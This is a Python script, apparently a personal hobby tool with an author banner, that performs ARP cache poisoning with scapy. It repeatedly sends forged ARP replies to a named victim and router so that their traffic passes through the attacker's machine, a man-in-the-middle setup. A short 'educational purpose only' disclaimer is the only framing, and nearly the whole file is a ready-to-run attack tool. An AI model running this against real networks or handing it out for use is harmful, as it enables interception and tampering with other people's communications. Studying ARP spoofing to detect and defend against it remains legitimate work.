"""Run this script using the syntax below:
sudo python3 arp_poison.py -M  my_mac -V Victim_mac Victim_ip -R Router_mac Router_ip
Disclimer:!!!!!! This is for educationnal purpose only,don't use it on netwoks you don't own !!!!!!!!!
"""
import scapy.all as scapy
import os
import sys
from time import *
#Logo and signature                               
print(r""" ||    _                                      _
           ||   //                                     ||
           || //    _____       _____            ___   ||
           ||\\    /  _  \  __ /  _  \ -     -  / _  \ ||
           ||  \\ /  (_|  ||/    (_)$  |     | | (_|  ||||____  
           ||   \\\_______||   \_____/ ||___|| \_____/||  _   \   __
                                                      || |_).  |//__)
                                                  _____|_\_____/||___ .01lig""")
print("\n****************************************************\n")
print("********Copyright of gilles karougbe, jully 2022********")
print("*********http://www.github.com/gilleskarougbe***********")
print("***********https://twiter.com/01karougbe****************")
print("***linkedin.com/in/essognim-gilles-karougbe-015979223***")
print("\n****************************************************\n")

#use super user privileges
def in_sudo_mode():
    """If the user doesn't run the program with super user privileges, don't allow them to continue."""
    if not 'SUDO_UID' in os.environ.keys():
        print("You are not root!\nTry running this program with sudo privileges.")
        exit()
#valide command line
def get_cmd_arguments():
    """ This function validates the command line arguments supplied on program start-up"""
    Args = None
    # Ensure that the user has specified 9 arguments
    if len(sys.argv) != 9:
        print("Error!!!!! You specified less than 9 arguments")
        return Args
    elif sys.argv[1]=='-M' and sys.argv[3]=='-V'and sys.argv[6]=='-R':
        try:
            L = []
            L.append(sys.argv[2])
            L.append(sys.argv[4])
            L.append(sys.argv[5])
            L.append(sys.argv[7])
            L.append(sys.argv[8])
            Args = L
        except:
            print("Invalid command-line arguments, check the documentation and try again")
            
    return Args

def ARP_POISON(my_mac,Victim_mac,Victim_ip,Router_mac,Router_ip):
#Ether fields
    Victim_ether = scapy.Ether(src=my_mac,dst=Victim_mac)
    Router_ether = scapy.Ether(src=my_mac,dst=Router_mac)
    #ARP fields
    Victim_arp = scapy.ARP(op = 2,hwsrc = my_mac,psrc = Router_ip,hwdst = Victim_mac,pdst = Victim_ip)
    Router_arp = scapy.ARP(op = 2,hwsrc = my_mac,psrc = Victim_ip ,hwdst = Router_mac,pdst = Router_ip )
    #stacking ether and arp
    Victim_pkt = Victim_ether/Victim_arp
    Router_pkt = Router_ether/Router_arp

    #sendings arp responses to the network
    for i in range(200):
        scapy.sendp(Victim_pkt,verbose = 0)
        scapy.sendp(Router_pkt,verbose = 0)
        sleep(2)
        
#check if sudo privileges is used
in_sudo_mode()

#verify and get arguments
Args = get_cmd_arguments()

#ARP_POISON function
ARP_POISON(Args[0],Args[1],Args[2],Args[3],Args[4])
"""Args[0]----->my_mac
   Args[1]----->Victim_mac
   Args[2]----->Victim_ip
   Args[3]----->Router_mac
   Args[4]----->Router_ip
"""
